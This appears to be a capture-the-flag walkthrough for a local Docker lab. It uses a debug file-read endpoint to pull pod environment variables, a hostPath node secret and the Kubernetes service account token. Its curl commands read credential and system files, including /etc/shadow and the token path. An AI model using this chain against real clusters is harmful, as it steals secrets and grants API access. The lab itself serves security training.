# Walkthrough

## Setup

```
$ docker compose up --build -d
```

## Step 1: probe the application

```
$ curl -s http://127.0.0.1:8099/
```

Note the debug `/api/read?path=` endpoint.

## Step 2: discover what paths are readable

```
$ curl -s 'http://127.0.0.1:8099/api/read?path=/etc/shadow'
```

Output shows the allowlist: `/proc/self/environ`, `/proc/self/mounts`, `/mnt/hostpath/node-secret.txt`, service account files.

## Step 3: read pod environment to get Flag 1

```
$ curl -s 'http://127.0.0.1:8099/api/read?path=/proc/self/environ'
```

Output contains `POD_SECRET=POC{...}`.

**Flag 1 captured.**

## Step 4: discover mount points

```
$ curl -s http://127.0.0.1:8099/api/mounts
```

Output shows `/mnt/hostpath` as a bind mount from the node.

## Step 5: read node secret from hostPath volume to get Flag 2

```
$ curl -s 'http://127.0.0.1:8099/api/read?path=/mnt/hostpath/node-secret.txt'
```

Output:

```json
{"content":"POC{...}","path":"/mnt/hostpath/node-secret.txt"}
```

**Flag 2 captured.**

## Bonus: read the service account token

```
$ curl -s 'http://127.0.0.1:8099/api/read?path=/var/run/secrets/kubernetes.io/serviceaccount/token'
```

In a real cluster, this token could be used to call the Kubernetes API as the pod's service account.

## Full attack chain

```
Arbitrary file read
        |
        v
/proc/self/environ -> POD_SECRET=FLAG1
        |
        v
/proc/self/mounts -> /mnt/hostpath is a node bind mount
        |
        v
/mnt/hostpath/node-secret.txt -> FLAG2
        |
        v
(In a real cluster: steal service account token -> Kubernetes API access)
```

## Automated exploit

```
$ python3 exploit/exploit.py
```

## Teardown

```
$ docker compose down
```
